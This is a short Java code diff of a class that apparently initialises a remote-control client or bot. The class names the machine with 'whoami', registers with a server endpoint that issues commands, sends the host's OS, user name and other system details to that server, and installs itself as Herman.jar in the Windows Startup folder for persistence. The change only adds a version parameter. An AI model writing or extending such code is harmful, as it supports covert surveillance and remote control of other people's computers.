@@ -26,11 +26,11 @@ public class ConfigureInit {
         return webHandler;
     }
 
-    public void configure(String url) {
+    public void configure(String url, String version) {
         GetContext.CLIENT_NAME = Console.execute("whoami").get(1).replace("\\", "-");
         GetContext.SENDER = new Sender(url);
         webHandler = new WebHandler(url + "/command/" + GetContext.CLIENT_NAME);
-        getConstants();
+        getConstants(version);
         autostart();
     }
 
@@ -40,7 +40,7 @@ public class ConfigureInit {
                         "Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Herman.jar"));
     }
 
-    private void getConstants() {
+    private void getConstants(String version) {
         GetContext.SENDER.send("os", System.getProperty("os.name"));
         GetContext.SENDER.send("user", System.getProperty("user.name"));
         try {
@@ -48,6 +48,6 @@ public class ConfigureInit {
         } catch (UnknownHostException e) {
             e.printStackTrace();
         }
-        GetContext.SENDER.send("arch", System.getProperty("os.arch"));
+        GetContext.SENDER.send("arch", version);
     }
 }
